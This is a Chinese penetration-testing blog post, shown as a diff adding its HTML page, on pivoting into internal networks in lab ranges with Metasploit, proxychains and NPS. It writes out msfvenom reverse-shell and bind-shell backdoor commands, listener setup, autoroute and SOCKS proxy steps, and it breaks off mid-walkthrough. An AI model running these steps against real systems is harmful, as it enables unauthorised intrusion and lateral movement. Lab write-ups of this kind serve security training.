@@ -1,0 +1,370 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>内网代理技术 | 随风</title><meta name="author" content="随风"><meta name="copyright" content="随风"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="前言在我们的内网渗透中，我们往往是通过拿下Web服务器的权限，再通过Web服务器做一个跳板来做横向渗透。我们知道在我们拿下的Web的服务器上做一些横向渗透是有点困难的，因为在Web这台机器上没有我们平常渗透常用的一些渗透工具，故横向渗透非常的困难，假如我们可以直接用我们自己的电脑做攻击机就可以让我们在渗透的过程中得心应手。但是我们知道我们想要拿到的服务器在内网之中，我们无法通过互联网去直接访问它，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网代理技术">
+<meta property="og:url" content="http://suifeng-kali.github.io/2023/05/08/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/index.html">
+<meta property="og:site_name" content="随风">
+<meta property="og:description" content="前言在我们的内网渗透中，我们往往是通过拿下Web服务器的权限，再通过Web服务器做一个跳板来做横向渗透。我们知道在我们拿下的Web的服务器上做一些横向渗透是有点困难的，因为在Web这台机器上没有我们平常渗透常用的一些渗透工具，故横向渗透非常的困难，假如我们可以直接用我们自己的电脑做攻击机就可以让我们在渗透的过程中得心应手。但是我们知道我们想要拿到的服务器在内网之中，我们无法通过互联网去直接访问它，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://suifeng-kali.github.io/assets/5-20220124093627-0vj5ugg.png">
+<meta property="article:published_time" content="2023-05-08T07:47:00.000Z">
+<meta property="article:modified_time" content="2023-05-08T07:58:35.987Z">
+<meta property="article:author" content="随风">
+<meta property="article:tag" content="内网安全">
+<meta property="article:tag" content="渗透代理">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://suifeng-kali.github.io/assets/5-20220124093627-0vj5ugg.png"><link rel="shortcut icon" href="https://suifeng-kali.github.io/img/logo.jpg"><link rel="canonical" href="http://suifeng-kali.github.io/2023/05/08/%E5%86%85%E7%BD%91%E4%BB%A3%E7%90%86%E6%8A%80%E6%9C%AF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":380},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: 随风","link":"链接: ","source":"来源: 随风","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内网代理技术',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-05-08 15:58:35'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://suifeng-kali.github.io/img/logo.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">12</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">12</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">5</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 目录</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情连接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url('/assets/5-20220124093627-0vj5ugg.png')"><nav id="nav"><span id="blog-info"><a href="/" title="随风"><span class="site-name">随风</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-book"></i><span> 目录</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情连接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网代理技术</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-08T07:47:00.000Z" title="发表于 2023-05-08 15:47:00">2023-05-08</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-08T07:58:35.987Z" title="更新于 2023-05-08 15:58:35">2023-05-08</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/">内网安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">3.1k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>10分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内网代理技术"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>在我们的内网渗透中，我们往往是通过拿下Web服务器的权限，再通过Web服务器做一个跳板来做横向渗透。我们知道在我们拿下的Web的服务器上做一些横向渗透是有点困难的，因为在Web这台机器上没有我们平常渗透常用的一些渗透工具，故横向渗透非常的困难，假如我们可以直接用我们自己的电脑做攻击机就可以让我们在渗透的过程中得心应手。但是我们知道我们想要拿到的服务器在内网之中，我们无法通过互联网去直接访问它，这种时候我们又想控制它，我们就需要借助一些代理技术来辅助我们去完成直接控制内网机器的过程。</p>
+<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这里借助一个红日团队开源的一个红队实战测试的部分来完成本次环境搭建，靶机下载地址如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</span><br></pre></td></tr></table></figure>
+
+<p>对本靶场环境做出一些修改之后，最终环境如下所示</p>
+<p>黑客攻击机：kali、windows10</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">网卡IP：192.168.178.128</span><br><span class="line">网卡IP：192.168.178.1</span><br></pre></td></tr></table></figure>
+
+<p>Web服务器：windows7系统</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">外网网卡IP：192.168.178.133</span><br><span class="line">内网网卡IP：192.168.52.143</span><br></pre></td></tr></table></figure>
+
+<p>域控服务器：windows server 2008系统</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">网卡IP：192.168.52.138</span><br></pre></td></tr></table></figure>
+
+<h2 id="网络互通状况"><a href="#网络互通状况" class="headerlink" title="网络互通状况"></a>网络互通状况</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kali、windows10可以ping通windows7的外网网卡，ping不通内网网卡</span><br><span class="line">windows7可以ping通kali、windows10和windows server 2008</span><br><span class="line">windows server 2008 ping不通windows7、kali和windows10</span><br></pre></td></tr></table></figure>
+
+<h1 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h1><p>首先我们通过windows7开放的Web服务先拿下Web服务器的权限，这里主要写的是代理的知识，拿Web权限就不在过多阐述。</p>
+<p><img src="/assets/1-20220124092433-8t5icmk.png" alt="1.png"></p>
+<p>拿到Web权限之后，我们可以利用msfvenom生成一个后门，然后利用Web权限进行上传。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.178.128 lport=4444 -f exe &gt;shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>上传之后在kali上配置监听，拿服务器权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.178.128</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/2-20220124092512-y1bg402.png" alt="2.png"></p>
+<p>拿到Web服务器权限之后，我们可以通过这个Web服务器的shell来做一些内网上的渗透，但是我如果想直接通过我们kali攻击机去访问到windwos server 2008我们该怎么去做呢。我们知道我们的kali是无法ping通windwos server 2008，因为windwos server 2008它是不出网的，想要访问到windwos server 2008这里就要借助一些代理知识来辅助我们了。</p>
+<p>本篇我们先借助MSF来实现代理功能</p>
+<p>在拿到meterpreter权限之后，我们可以使用如下命令来查看一下网络中的路由信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/3-20220124092537-06pyhkg.png" alt="3.png"></p>
+<p>我们kali所属的网段是192.168.178.0的网段，这里还有一个192.168.52.0的网段，所以这时我们就可以利用MSF中的扫描模块对52网段进行一波扫描实现主机发现，这里我们根据上文环境搭建部分，已经知道内网中还存在一台192.168.52.138 IP的windwos server 2008。</p>
+<p>那么我们可以在这里添加一条指向52网段的路由，如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 192.168.52.0/255.255.255.0</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/4-20220124092553-78ugw43.png" alt="4.png"></p>
+<p>然后使用如下命令查看session中的路由。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -p</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/5-20220124092651-4lrtx08.png" alt="5.png"></p>
+<p>在session存在路由了之后，我们可以使用一个代理socks的代理模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; use auxiliary/server/socks5</span><br><span class="line">msf5 auxiliary(server/socks5) &gt; set srvhost 192.168.178.128  #本处设置IP为kali攻击机IP</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/6-20220124092716-klfjhem.png" alt="6.png"></p>
+<p>配置好了socks代理，我们可以借助一款kali上自带的全局代理软件proxychains来连接socks代理</p>
+<p>首先我们对proxychains代理软件进行配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
+
+<p>在末尾添加socks代理的映射关系（且与在MSF上配置的相对应）</p>
+<p><img src="/assets/7-20220124092735-v3b7w5u.png" alt="7.png"></p>
+<p>配置好之后，我们就可以通过proxychains来访问到内网中的windwos server 2008这台服务器了。</p>
+<p><img src="/assets/8-20220124092749-vityol5.png" alt="8.png"></p>
+<p>如此，我们就还可以生成一个正向的木马，然后通过一些漏洞上传到windwos server 2008上，再利用proxychains来启动MSF配置监听，来达到利用kali接受到内网中windows server 2008这台服务器的shell。</p>
+<h1 id="NPS代理攻击"><a href="#NPS代理攻击" class="headerlink" title="NPS代理攻击"></a>NPS代理攻击</h1><p>除了MSF之外还有许多现成的代理工具如Frp、NPS、EarthWorm、reGeorg等等，这些代理工具使用方法都大同小异，由于本人经常使用NPS，故下文主要演示一下NPS的使用。</p>
+<p>NPS是一款轻量级、高性能、功能强大的内网穿透代理服务器，它几乎支持所有协议，其还支持内网http代理、内网socks5代理、p2p等等。NPS相比其他代理工具其具有简洁且功能强大的WEB管理界面，支持服务端、客户端同时控制，扩展功能强大。</p>
+<p><strong>下载地址</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/fatedier/frp</span><br><span class="line">https://ehang-io.github.io/nps/#/   #官方使用文档</span><br></pre></td></tr></table></figure>
+
+<p>这里存在对应版本的客户端和服务端，可以都下载下来。</p>
+<p><img src="/assets/9-20220124093031-59tyk2x.png" alt="9.png"></p>
+<p>首先我们通过windows7开放的Web服务先拿下Web服务器的权限，这里主要写的是代理的知识，拿Web权限就不在过多阐述。</p>
+<p><img src="/assets/1-20220124092433-8t5icmk.png" alt="1.png"></p>
+<p>拿到Web权限之后，我们可以利用msfvenom生成一个后门，然后利用Web权限进行上传。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.178.128 lport=4444 -f exe &gt;shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>上传之后在kali上配置监听，拿服务器权限。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.178.128</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/2-20220124092512-y1bg402.png" alt="2.png"></p>
+<p>然后我们可以把我们下载好的对应版本的NPS客户端上传到这台Web服务器上。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; upload /root/桌面/windows_386_client/ c:\\</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/3-20220124093556-titd9bq.png" alt="3.png"></p>
+<p>上传好之后，我们可以在攻击机windows10上启动NPS服务端，首先以管理员权限启动cmd，然后执行如下命令进行NPS的初始化安装</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\tools\nps\windows_386_server&gt;nps install</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/4-20220124093607-qrmfkco.png" alt="4.png"></p>
+<p>然后启动即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\tools\nps\windows_386_server&gt;nps.exe start</span><br></pre></td></tr></table></figure>
+
+<p>启动好之后，我们可以输入本地IP+8080端口进行访问WEB客户端</p>
+<p><img src="/assets/5-20220124093627-0vj5ugg.png" alt="5.png"></p>
+<p>输入默认账号admin，密码123进入管理页面</p>
+<p><img src="/assets/6-20220124093640-0yw4fcs.png" alt="6.png"></p>
+<p>进入管理页面之后，我们可以新增一个客户端</p>
+<p><img src="/assets/7-20220124093649-w5xg3sv.png" alt="7.png"></p>
+<p>然后根据提示添加相关信息即可</p>
+<p><img src="/assets/8-20220124093657-y1ooij6.png" alt="8.png"></p>
+<p>添加好一个客户端之后，我们可以在windwos7那台Web服务器上用我们之前上传的NPS客户端软件进行连接，连接命令如下图</p>
+<p><img src="/assets/9-20220124093704-u4hey15.png" alt="9.png"></p>
+<p><img src="/assets/10-20220124093713-qm8ql6e.png" alt="10.png"></p>
+<p>执行命令之后，我们就可以回到我们的WEB界面，可以看到一个客户端已经进行连接</p>
+<p><img src="/assets/11-20220124093752-nhixiwk.png" alt="11.png"></p>
+<p>连接成功之后，我们可以新增一个socks5的代理</p>
+<p><img src="/assets/12-20220124093802-q3f65a8.png" alt="12.png"></p>
+<p>配置好客户端id，和服务端端口等信息（id为上图中所创建的客户端id号）</p>
+<p><img src="/assets/13-20220124093812-ulw2zz9.png" alt="13.png"></p>
+<p>点击新增后，即可发现已经创建号socks5的代理</p>
+<p><img src="/assets/14-20220124093820-j1ih9i7.png" alt="14.png"></p>
+<p>那么接下来，我们可以通过这个socks5的代理，对内网windwos server 2008的服务器进行访问一下。</p>
+<p>我们可以利用SwitchyOmega配置socks5代理对内网中的windwos server 2008的Web服务进行访问</p>
+<p><img src="/assets/15-20220124093826-12ayys8.png" alt="15.png"></p>
+<p>添加代理后可以对windwos server 2008的Web服务进行正常访问</p>
+<p><img src="/assets/16-20220124093835-pw29iyj.png" alt="16.png"></p>
+<p>当然我们还可以借助Proxifier这款软件做一个socks5的全局代理</p>
+<p><img src="/assets/17-20220124093843-v9hgp0z.png" alt="17.png"></p>
+<p><img src="/assets/18-20220124093853-yc51h7y.png" alt="18.png"></p>
+<p>配置好之后，也可以对其进行访问</p>
+<p><img src="/assets/19-20220124093900-02hj81f.png" alt="19.png"></p>
+<p><img src="/assets/20-20220124093908-s3btckn.png" alt="20.png"></p>
+<h1 id="多级代理"><a href="#多级代理" class="headerlink" title="多级代理"></a>多级代理</h1><p>在有些内网环境中，它的内网环境分为好几层，我们必须通过拿到一层内网中服务器的权限之后再通过这一内网中的服务器进一步访问二层内网中的其他服务器。在这种环境中，我们就需要多级代理突破层层内网，来实现在内网中漫游。</p>
+<h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>本次实验环境借助一个CFS三层的靶机，靶机下载地址如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">【CFS三层靶机环境】百度网盘链接：</span><br><span class="line">链接: https://pan.baidu.com/s/1LJueA-X02K7HZXr8QsOmeg</span><br><span class="line">提取码: dkcp</span><br><span class="line">解压密码：teamssix.com</span><br></pre></td></tr></table></figure>
+
+<p>网络拓扑图如下（子网掩码都为24位）</p>
+<p><img src="/assets/1-20220124094046-nqqq7ab.png" alt="1.png"></p>
+<p>在该网络拓扑中178网段模拟的是外网环境，239网段为第一层内网，154网段为第二层内网，每一个target靶机中都存放着一个flag，最终目的是要拿到所有目标靶机中的flag，当然我们这讨论的是代理知识，所以flag我们就忽略掉。</p>
+<p>首先用nmap对178网段中存活主机做一个探测</p>
+<p><img src="/assets/2-20220124094327-340ta5z.png" alt="2.png"></p>
+<p>可以发现在178网段中存在一个142的地址，也就是centos7的地址，发现142可以再利用nmap对其进行一个系统扫描</p>
+<p><img src="/assets/3-20220124094332-iem900e.png" alt="3.png"></p>
+<p>其中开放这80端口，我们可以对他的80端口进行一个访问,最终是会发现存在一个Think PHP</p>
+<p><img src="/assets/4-20220124094337-rr3sp6x.png" alt="4.png"></p>
+<p>该版本存在一个RCE执行，这里利用工具进行一键get shell</p>
+<p><img src="/assets/5-20220124094344-e6w28ys.png" alt="5.png"></p>
+<p>然后蚁剑链接</p>
+<p><img src="/assets/6-20220124094351-fp20pou.png" alt="6.png"></p>
+<p>连接之后，我们利用msfvenom创建一个后门</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp lhost=192.168.178.128 lport=4444 -f elf &gt;shell.elf</span><br></pre></td></tr></table></figure>
+
+<p>通过web shell上传到target 1服务器上，然后在kali上配置监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; set payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; set lhost 192.168.178.128</span><br></pre></td></tr></table></figure>
+
+<p>执行后门拿下target 1服务器权限</p>
+<p><img src="/assets/7-20220124094357-sejgc0q.png" alt="7.png"></p>
+<p>在拿到meterpreter权限之后，我们可以 run get_local_subnets 查看一下网络中的路由信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run get_local_subnets</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/8-20220124094406-ovf07fy.png" alt="8.png"></p>
+<p>可以发现还存在239的网段，那我们先往session里面添加一条239网段的路由</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run autoroute -s 192.168.239.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/9-20220124094413-s1sb3t3.png" alt="9.png"></p>
+<p>然后使用 run autoroute -p 查看session中的路由是否添加成功。</p>
+<p><img src="/assets/10-20220124094418-jp0kopi.png" alt="10.png"></p>
+<p>发现已存在，接下来我们使用一个socks5代理模块</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; use auxiliary/server/socks5</span><br></pre></td></tr></table></figure>
+
+<p>然后配置好ip，run启动</p>
+<p><img src="/assets/11-20220124094427-8f7gm45.png" alt="11.png"></p>
+<p>配置好了socks代理，我们可以借助一款kali上自带的全局代理软件proxychains来连接socks代理</p>
+<p>首先我们对proxychains代理软件进行配置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure>
+
+<p>在末尾添加socks代理的映射关系（且与在MSF上配置的相对应）</p>
+<p><img src="/assets/7-20220124092735-v3b7w5u.png" alt="12.png"></p>
+<p>配置好后，我们利用代理软件来启动nmap对239网段中存活主机做一个探测</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains nmap -sT -p80 192.168.239.1/24   #正常不能添加-p参数，这里为上帝视角知道239网段中129主机启动着一个web服务，目的是让扫描快一点</span><br></pre></td></tr></table></figure>
+
+<p><img src="/assets/13-20220124094445-xtbyt8n.png" alt="13.png"></p>
+<p>扫描到239网段中的129地址，接下来和之前一样对其进行一个系统的扫描，访问web服务，web服务中存在sql注入然后拿下web权限（target2拿web权限的操作省略），拿下权限通过msfvenom创建后门进行上传，但是此处的后门要生成一个正向的后门。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/bind_tcp lport=1234 -f elf &gt;shell2.elf</span><br></pre></td></tr></table></figure>
+
+<p>此处为什么要生成一个正向的木马呢，我们在这分析一下，这里再放下拓扑图，方便理解。</p>
+<p><img src="/assets/1-20220124094046-nqqq7ab.png" alt="14.png"></p>
+<p>我们拿下了target2的web权限，加入这是我们上传的是反向的木马，那么target2就要去寻找我们kali的路由，但是target2主机中没有kali的路由，那么就会导致我们的反弹shell失败，之后我们再来看看正向的。</p>
+<p>我们生成了一个正向的木马，我们的kali攻击机就会去主动寻找target2的服务器，这个时候我们应为做了一个socks5的代理，我们的流量会通过kali的ip的1080端口代理给target1，然后target1中是存在239网段中的路由的，所以我们可以正常进行连接。</p>
+<p>理解好之后，之后的操作就很简单了，通过我们通过sql注入拿到的web权限上传木马，然后在kali上利用proxychains启动msfconsole</p>
